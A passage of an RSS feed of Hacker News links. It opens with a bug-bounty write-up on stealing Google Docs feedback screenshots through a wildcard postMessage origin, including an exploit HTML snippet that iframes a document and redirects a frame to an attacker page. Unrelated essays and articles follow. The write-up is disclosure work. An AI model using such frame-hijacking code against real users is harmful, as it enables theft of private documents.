image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.</p><h2 id="the-bug">The Bug</h2><p>There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.</p><p>Below is a graphical representation of the steps in this process – </p><figure><img src="https://savebreach.com/content/images/2020/12/image-23.png" alt=""><figcaption>How the screenshot was uploaded to Google servers</figcaption></figure><p>The following <code>postmessage</code> function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.</p><pre><code>windowRef.postmessage("&lt;Data&gt;","https://feedback.googleusercontent.com");</code></pre><p>However, the final <code>postmessage</code> function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website</p><pre><code>windowRef.postmessage("&lt;Data&gt;","*");</code></pre><p>The wildcard scope allowed the <code>postmessage</code> data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope <code>*</code> &nbsp;that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers</p><p>Also, worth noting that the exploit worked in this case as Google Docs, by design has no <code>X-Frame-Options header</code>, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.</p><h2 id="the-final-exploit">The Final Exploit</h2><p>Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using <code>window.frames.frame.location</code> to load my exploit page from an external domain and steal user's Google Docs page screenshot</p><pre><code>&lt;html&gt;
    &lt;iframe src="https://docs.google.com/document/document_ID" /&gt;
    &lt;script&gt;
       //pseudo code
        
        
        setTimeout(function(){ alert("Hello"); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre><p>The above exploit gets triggered only once the user clicks on <strong>Send Feedback </strong>button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads – the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.</p><p>This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).</p><p>The <code>exploit.html</code> contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.</p><h2 id="video-poc-of-the-exploit">Video PoC of the Exploit</h2><p>Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/isM-BXj4_80?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="the-bounty">The Bounty</h2><p>Google rewarded <strong>$3133.7</strong> &nbsp;for this bug under their VRP program.</p><p><a href="https://twitter.com/kl_sree">KL Sreeram</a> is a security researcher and bug bounty hunter. He is one of the top researchers in the Google VRP program. This bug was first documented by KL Sreeram on his <a href="https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/">blog</a>.</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to SaveBreach | Cyber Security, InfoSec, Bug Bounty &amp; Domain Names</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559063</guid>
            <pubDate>Mon, 28 Dec 2020 13:35:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Against Company Values]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558934">thread link</a>) | @lftherios
<br/>
December 28, 2020 | http://eleftherios.io/against-company-values/ | <a href="https://web.archive.org/web/*/http://eleftherios.io/against-company-values/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
    <p><strong>April, 2020</strong></p>
<p>Technology companies love to talk about their values. Unfortunately, values are highly abstract and ambivalent constructs that mean different things to different people.</p>
<p>In my opinion, the reason why certain companies (or the leadership teams) love values so much is due to a fundamental lack of inspiring visions. When your company's purpose is to make people click on useless ads, you've got to come up with something else to inspire your employees. Luckily, humans are built with descent bullshit detectors and in practice this form of corporate jargon rarely works as a motivator.</p>
<p>Recognizing the above, I believe that organizations that have a meaningful reason to exist (ie something people can stand behind) should start the other way around. They should define their purpose, spend quality time describing and documenting the world they adhere to, and then reverse engineer from that.</p>
<p>An organization that strives to be <em>fully aligned</em> with its purpose, <em>highly aligned</em> with its day to day practices and <em>loosely aligned</em> in terms of beliefs and principles is more likely to create an inspiring environment for existing and potential employees.</p>

</div></div>]]>
            </description>
            <link>http://eleftherios.io/against-company-values/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558934</guid>
            <pubDate>Mon, 28 Dec 2020 13:11:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Recurring reviews to track the whole lifecycle of a product]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 55 (<a href="https://news.ycombinator.com/item?id=25558891">thread link</a>) | @hubraumhugo
<br/>
December 28, 2020 | https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product | <a href="https://web.archive.org/web/*/https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558891</guid>
            <pubDate>Mon, 28 Dec 2020 13:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Images of the the samples returned to earth from the asteroid Ryugu]]>
            </title>
            <description>
<![CDATA[
Score 489 | Comments 128 (<a href="https://news.ycombinator.com/item?id=25558874">thread link</a>) | @naetius
<br/>
December 28, 2020 | http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/ | <a href="https://web.archive.org/web/*/http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558874</guid>
            <pubDate>Mon, 28 Dec 2020 13:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microfarm on the International Space Station Grows Radishes in One Month]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558865">thread link</a>) | @bookofjoe
<br/>
December 28, 2020 | https://smosa.com/microfarm-on-the-international-space-station-grows-radishes-in-one-month/ | <a href="https://web.archive.org/web/*/https://smosa.com/microfarm-on-the-international-space-station-grows-radishes-in-one-month/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>The thought of eating "astronaut food" brings to mind a kind of instant food that is far from "farm to table." However, recent experiments aboard the ISS are improving our understanding of how to bring the farm directly into space itself.</p><p>Astronauts just ran a Veg-PONDS 02 experiment on the International Space Station. The experiment used food that was cultivated in space. Potential cultivations could include tomatoes or other plants, NASA says.</p><p>On November 30th, Kate Rubins took about 6 packs of radishes from the lab and stored them in a refrigerated unit after gathering them up—freshly grown in space. The process opens new doors for microgravity food processing to enable future long-term moon and Mars missions. The radish sprouts will be sent back to Earth early next year on SpaceX's 22nd Commercial Resupply Services mission, NASA announced.</p><figure><img src="https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Rzodkiewka " srcset="https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@jo_lanta?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Jo Lanta</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Radishes, a well-known fresh vegetable, were chosen for the Plant Habitat-02 experiment because vegetables are well understood by scientists. Radishes are perfectly useful for in-orbit space research. They are edible, nutritious and similar to Arabidopsis, a small flowering plant that has been studied by NASA repeatedly.</p><p>A new method lets astronauts cultivate romaine lettuce seeds in 12 passive orbital nutrient delivery systems. The units are less expensive than the seed bags and can hold more water, NASA says. Six of the 12 PONDS units will be returned to Earth on a future SpaceX mission for further analysis. More nutrition will be required for space explorers on their way to Mars.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/UT0K3GmNV7E?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>"There comes a point where you have longer and longer duration missions, and you reach a cost-benefit point where it makes sense to grow your own food," said chief scientist of NASA's Utilization and Life Sciences Office at the Kennedy Space Center Howard Levine in a statement.</p><p>The APH Chamber uses LED lights to improve plant growth, while an automated control system provides water to the plant. 180 sensors track plant growth and monitoring the temperature, humidity and carbon dioxide levels.</p><p>Astronauts will plant a further round of radish seeds in the APH second science carrier. The move will increase sample size for spatial radis to increase the precision of the experience.</p>
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article><div>
					<h2>Post navigation</h2>
					<div>
						
						<p><a href="https://smosa.com/no-cashier-grocery-stores-are-coming/"><img src="https://smosa.com/content/images/size/w250/2020/12/entering-store-with-zippin-app.jpg" alt="No-Cashier Grocery Stores Are Coming"></a>
					</p></div>
					<div>
						
							<p><a href="https://smosa.com/no-effective-solution-for-nanoplastics-in-our-intestines-environment/"><img src="https://smosa.com/content/images/size/w250/2020/12/252241_web-gigapixel-scale-6_00x.jpg" alt="&quot;No Effective Solution&quot; for Nanoplastics In Our Intestines, Environment"></a>
					</p></div>
				</div></div>]]>
            </description>
            <link>https://smosa.com/microfarm-on-the-international-space-station-grows-radishes-in-one-month/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558865</guid>
            <pubDate>Mon, 28 Dec 2020 12:59:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics (still) a challenge?]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25558815">thread link</a>) | @mariuz
<br/>
December 28, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558815</guid>
            <pubDate>Mon, 28 Dec 2020 12:51:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Incremental Packrat Parsing [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558535">thread link</a>) | @pdubroy
<br/>
December 28, 2020 | https://ohmlang.github.io/pubs/sle2017/incremental-packrat-parsing.pdf | <a href="https://web.archive.org/web/*/https://ohmlang.github.io/pubs/sle2017/incremental-packrat-parsing.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://ohmlang.github.io/pubs/sle2017/incremental-packrat-parsing.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558535</guid>
            <pubDate>Mon, 28 Dec 2020 11:55:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built a flashcard platform that supports latex and code highlighting]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25558420">thread link</a>) | @mvind
<br/>
December 28, 2020 | https://memordo.com/m/h | <a href="https://web.archive.org/web/*/https://memordo.com/m/h">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-28a2eea8=""><p><img id="hero-pic" src="https://memordo-assets.ams3.digitaloceanspaces.com/front-page-assets/Group%203%20%281%29.png" data-v-28a2eea8=""></p> <div data-v-28a2eea8=""> <h3 data-v-28a2eea8="">
        Introducing the all-new collaborative flashcard platform, lovingly made to help you.

      </h3> </div></div><div data-v-28a2eea8=""><div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/typing.801f4d3.svg" data-v-28a2eea8=""><br data-v-28a2eea8="">
             Use the familiar Anki flashcard types like <strong data-v-28a2eea8=""> single</strong>, <strong data-v-28a2eea8="">double</strong>, <strong data-v-28a2eea8="">cloze deletion</strong>.
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/schedule.cbe60f8.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
          Create <strong data-v-28a2eea8=""> custom study schedules </strong></p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/analytics.3f4cba7.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
            Gain <strong data-v-28a2eea8=""> insights </strong> into your studying
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/network.edf1efc.svg" data-v-28a2eea8=""> <br data-v-28a2eea8=""> <strong data-v-28a2eea8=""> Share </strong> and <strong data-v-28a2eea8=""> collaborate </strong> in creating flashcards
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/digital-marketing.7ca7dbb.svg" data-v-28a2eea8=""><br data-v-28a2eea8="">
            Create flashcards with <strong data-v-28a2eea8="">images</strong>, <strong data-v-28a2eea8=""> latex</strong>, <strong data-v-28a2eea8=""> code</strong>, <strong data-v-28a2eea8=""> languages </strong></p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/reminder.2a2f3d4.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
            We help <strong data-v-28a2eea8="">reminding</strong> you to study
          </p></div></div></div>]]>
            </description>
            <link>https://memordo.com/m/h</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558420</guid>
            <pubDate>Mon, 28 Dec 2020 11:34:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Performance Overhead of JavaScript Promises and Async Await]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25558279">thread link</a>) | @me4502
<br/>
December 28, 2020 | https://matthewmiller.dev/blog/javascript-promise-overhead/ | <a href="https://web.archive.org/web/*/https://matthewmiller.dev/blog/javascript-promise-overhead/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>
      <span></span>
  <picture>
        <source srcset="https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/77434/javascript-promise-overhead.webp 300w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/411c4/javascript-promise-overhead.webp 600w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/cbd37/javascript-promise-overhead.webp 1200w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/64296/javascript-promise-overhead.webp 1600w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/a8a0d/javascript-promise-overhead.png 300w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/dface/javascript-promise-overhead.png 600w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/64756/javascript-promise-overhead.png 1200w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/42cbc/javascript-promise-overhead.png 1600w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img src="https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/64756/javascript-promise-overhead.png" alt="The Performance Overhead of JavaScript Promises and Async Await" title="The Performance Overhead of JavaScript Promises and Async Await" loading="lazy">
      </picture>
    </span></p>
<p>JavaScript as a language is heavily asynchronous, with promises being deeply integrated. The inclusion of async/await syntax has massively improved this, making asynchronous code much more readable. Being able to mark methods as async makes it much easier to integrate into existing parts of code, sometimes causing large chains of method calls to become async for a single deep method call. While this is sometimes the best solution, can the overhead of promises pose a problem for hot code?</p>
<h3 id="benchmarks"><a href="#benchmarks" aria-label="benchmarks permalink"></a>Benchmarks</h3>
<p>As of writing, the v8 JavaScript engine that powers both Chromium and NodeJS does not optimise out redundant promises. Due to this, a decent benchmark to determine just the overhead of promises is to take a typical function call and make it a promise. For this case, I'm using a function that calculates a position in the Fibonacci sequence.</p>
<h4 id="test-1---recursive-fibonacci"><a href="#test-1---recursive-fibonacci" aria-label="test 1   recursive fibonacci permalink"></a>Test 1 - Recursive Fibonacci</h4>
<p>The first test is using a recursive Fibonacci function. Using a recursive function as a test case here means we will get a compounding overhead from the promises. This result will show us a relatively worse case example.</p>
<p>The following code has been used,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>num <span>&lt;=</span> <span>1</span><span>)</span> <span>return</span> <span>1</span><span>;</span>
  <span>return</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>1</span><span>)</span> <span>+</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>2</span><span>)</span><span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>10</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="javascript"><pre><code>
<span>async</span> <span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>num <span>&lt;=</span> <span>1</span><span>)</span> <span>return</span> <span>1</span><span>;</span>
  <span>return</span> <span>(</span><span>await</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>1</span><span>)</span><span>)</span> <span>+</span> <span>(</span><span>await</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>2</span><span>)</span><span>)</span><span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>10</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  
  
